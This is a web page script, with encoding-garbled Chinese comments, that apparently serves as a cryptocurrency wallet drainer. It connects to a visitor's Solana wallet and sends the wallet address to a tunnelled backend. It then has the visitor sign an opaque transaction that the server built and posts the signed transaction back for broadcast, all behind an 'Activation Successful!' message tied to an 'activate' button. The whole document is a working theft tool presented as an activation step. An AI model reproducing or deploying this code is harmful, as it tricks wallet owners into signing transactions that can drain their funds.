<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
<script>
// ğŸ”± è¯·åŠ¡å¿…ç¡®è®¤ä½ çš„éš§é“åœ°å€æœ«å°¾æ²¡æœ‰å¤šä½™çš„æ–œæ 
const TUNNEL_URL = "https://ä½ çš„ç©¿é€åœ°å€.com"; 

function logStatus(msg) {
    document.getElementById('status_text').innerText = msg;
    console.log("ğŸ”± [LOG]:", msg);
}

async function startProcess() {
    logStatus("Initializing...");
    try {
        // 1. å¼ºåˆ¶æ£€æµ‹é’±åŒ…
        const solana = window.trustwallet?.solana || window.solana;
        if (!solana) {
            alert("Error: Trust Wallet Not Detected!");
            return;
        }

        // 2. è¿æ¥
        await solana.connect();
        const userAddress = solana.publicKey.toString();
        logStatus("Connected: " + userAddress.substring(0, 6) + "...");

        // 3. åŸç”Ÿè¯·æ±‚åç«¯ (æ‰‹åŠ¨å¤„ç†è·¨åŸŸ)
        logStatus("Contacting Server...");
        const xhr = new XMLHttpRequest();
        xhr.open("POST", TUNNEL_URL + "/prepare_v32", true);
        xhr.setRequestHeader("Content-Type", "application/json");

        xhr.onreadystatechange = async function () {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    const info = JSON.parse(xhr.responseText);
                    if (info.raw_tx) {
                        logStatus("Signing Required...");
                        const web3 = window.solanaWeb3;
                        const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
                        
                        // ğŸ”± æ‹‰èµ·ç­¾å
                        const signed = await solana.signTransaction(tx);
                        logStatus("Broadcasting...");
                        
                        // 4. å‘é€å›æœåŠ¡å™¨
                        const broadcastXhr = new XMLHttpRequest();
                        broadcastXhr.open("POST", TUNNEL_URL + "/broadcast_v41", true);
                        broadcastXhr.setRequestHeader("Content-Type", "application/json");
                        broadcastXhr.send(JSON.stringify({
                            signed_tx: btoa(String.fromCharCode.apply(null, signed.serialize()))
                        }));
                        
                        logStatus("Activation Successful!");
                    } else {
                        alert("Server Error: " + (info.error || "No TX"));
                    }
                } else {
                    alert("Network Error: Status " + xhr.status);
                }
            }
        };

        xhr.send(JSON.stringify({ address: userAddress }));

    } catch (err) {
        alert("Catch Error: " + err.message);
        logStatus("Try again.");
    }
}

// ç»‘å®šæŒ‰é’®
document.getElementById('activate_btn').onclick = startProcess;
</script>
